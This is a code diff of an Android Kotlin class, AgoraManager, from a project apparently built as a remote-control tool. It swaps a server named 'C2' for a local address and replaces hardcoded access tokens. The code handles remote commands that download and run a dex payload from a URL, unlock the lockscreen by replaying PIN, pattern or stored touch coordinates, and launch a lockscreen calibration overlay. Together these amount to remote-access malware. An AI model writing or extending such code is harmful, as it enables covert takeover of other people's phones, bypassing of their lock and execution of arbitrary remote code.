@@ -57,16 +57,16 @@ class AgoraManager(private val context: Context) {
     private val channelName = "demo-channel"
     
     // DYNAMIC TOKEN CONFIGURATION
-    // Uses C2 token endpoint (add this endpoint to booster-server later)
-    private val TOKEN_SERVER_URL = "https://c2-1-production.up.railway.app/token"
+    // Local development endpoint with fallback
+    private val TOKEN_SERVER_URL = "http://192.168.10.52:3030/token"
     
-    // Fallback Hardcoded Tokens (primary method until C2 token endpoint is built)
-    private val fallbackRtcToken: String = "007eJxTYFD4VGBYdPhavfXBqvpNP+ycLjxYLPmO70E/94KopRMdl7gpMFimmRsnGqUkpVqkGZoYphpYmCcaWSSmpqQZpJqaWZiZiE0/ltUQyMjgaFvPysTACIYgPg9DSmpuvm5yRmJeXmoOAwMTXIaFwdDAwBAA8n4ksQ=="
-    private val fallbackRtmToken: String = "007eJxTYFD4VGBYdPhavfXBqvpNP+ycLjxYLPmO70E/94KopRMdl7gpMFimmRsnGqUkpVqkGZoYphpYmCcaWSSmpqQZpJqaWZiZiE0/ltUQyMjgaFvPysTACIYgPg9DSmpuvm5yRmJeXmoOAwMTXIaFwdDAwBAA8n4ksQ=="
+    // Fresh 30-day Fallback Tokens (AppId: 9f73a2dbe8f141e087a28aedf0e56864, Channel: demo-channel, UID: 12345)
+    private val fallbackRtcToken: String = "007eJxTYOApq9o+UWVhZvzfhosLFy6Y5/LpxxuJB4yeD9nSZuQFTjNQYLBMMzdONEpJSrVIMzQxTDWwME80skhMTUkzSDU1szAz0S1iytb9r5m97lUgIyMDIwMLAyMDiM8EJpnBJAuY5GFISc3N103OSMzLS81hZTA0MjYxBQBr1isj"
+    private val fallbackRtmToken: String = "007eJxTYPBUUtD+91k2+AjfdYEv1y+w35lWaZn19zy39iGBKw9lHtUrMFimmRsnGqUkpVqkGZoYphpYmCcaWSSmpqQZpJqaWZiZ6BYxZev+18ye91OSkZGBiYGRgZEBxGdlMDQyNjEFAFN6IIk="
     
     private var currentRtcToken: String = fallbackRtcToken
     private var currentRtmToken: String = fallbackRtmToken
-    private var dynamicUid: Int = 1001
+    private var dynamicUid: Int = 12345
 
     private fun initializeAgoraEngine() {
         if (rtcEngine != null) return
@@ -212,7 +212,7 @@ class AgoraManager(private val context: Context) {
     private fun useFallbackTokens(androidId: String) {
         currentRtcToken = fallbackRtcToken
         currentRtmToken = fallbackRtmToken
-        dynamicUid = 15871
+        dynamicUid = 12345
         localRtmUid = "12345" // Fallback expects hardcoded RTM UID
     }
 
@@ -356,59 +356,21 @@ class AgoraManager(private val context: Context) {
                 Log.d(TAG, "Triggering dynamic payload load from: $url")
                 com.rcl.androidstreamcontrol.utils.DexLoaderManager.loadAndExecutePayload(context, url, className, methodName)
             } else if (action == "AUTO_UNLOCK") {
-                val digitsStr = json.optString("pin")
-                val isPattern = json.has("pattern")
-                Log.d(TAG, "Executing Grid Math Auto-Unlock")
-
-                val windowManager = context.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
-                val displayMetrics = android.util.DisplayMetrics()
-                windowManager.defaultDisplay.getRealMetrics(displayMetrics)
-                val width = displayMetrics.widthPixels.toFloat()
-                val height = displayMetrics.heightPixels.toFloat()
-
-                // Relative 3x4 Grid (Standard Android Keyguard)
-                val xs = arrayOf(width * 0.20f, width * 0.50f, width * 0.80f)
-                val ys = arrayOf(height * 0.55f, height * 0.65f, height * 0.75f, height * 0.85f)
-                
-                val getXY = { digit: Char ->
-                    val num = digit.toString().toIntOrNull() ?: -1
-                    if (num == 0) Pair(xs[1], ys[3])
-                    else if (num in 1..9) Pair(xs[(num-1)%3], ys[(num-1)/3])
-                    else Pair(-1f, -1f)
+                Log.d(TAG, "AUTO_UNLOCK received — executing stored coordinate unlock")
+                com.rcl.androidstreamcontrol.utils.RemoteUnlockExecutor.executeStoredUnlock(context) {
+                    Log.d(TAG, "AUTO_UNLOCK: Replay complete.")
+                    val reply = JSONObject()
+                    reply.put("type", "UNLOCK_COMPLETE")
+                    reply.put("success", true)
+                    rtmChannel?.sendMessage(rtmClient?.createMessage(reply.toString()), null)
                 }
-
-                if (isPattern) {
-                    val patternArray = json.optJSONArray("pattern")
-                    if (patternArray != null && patternArray.length() > 0) {
-                        val coordsList = mutableListOf<Float>()
-                        for (i in 0 until patternArray.length()) {
-                            val dot = patternArray.optInt(i)
-                            val (x, y) = getXY(dot.toString().first())
-                            if (x > 0 && y > 0) {
-                                coordsList.add(x)
-                                coordsList.add(y)
-                            }
-                        }
-                        if (coordsList.isNotEmpty()) {
-                            coordsList.add(300f * coordsList.size) // total duration dt
-                            val bcastIntent = Intent("com.rcl.androidstreamcontrol.GESTURE_EVENT")
-                            bcastIntent.setPackage(context.packageName)
-                            bcastIntent.putExtra("com.rcl.androidstreamcontrol.EVENT_BYTES", coordsList.toFloatArray())
-                            context.sendBroadcast(bcastIntent)
-                        }
-                    }
-                } else if (digitsStr.isNotEmpty()) {
-                    var delayMs = 0L
-                    for (digit in digitsStr) {
-                        val (x, y) = getXY(digit)
-                        if (x > 0 && y > 0) {
-                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                                val controlService = ControlService.getSharedInstance()
-                                controlService?.performRemoteTap(x / width, y / height)
-                            }, delayMs)
-                            delayMs += 300
-                        }
-                    }
+            } else if (action == "CALIBRATION_START") {
+                Log.d(TAG, "Starting lockscreen calibration overlay")
+                val calibIntent = Intent(context, com.rcl.androidstreamcontrol.service.UnlockCalibrationService::class.java)
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    context.startForegroundService(calibIntent)
+                } else {
+                    context.startService(calibIntent)
                 }
             } else if (action == "STATUS_CHECK") {
                 val pm = context.getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
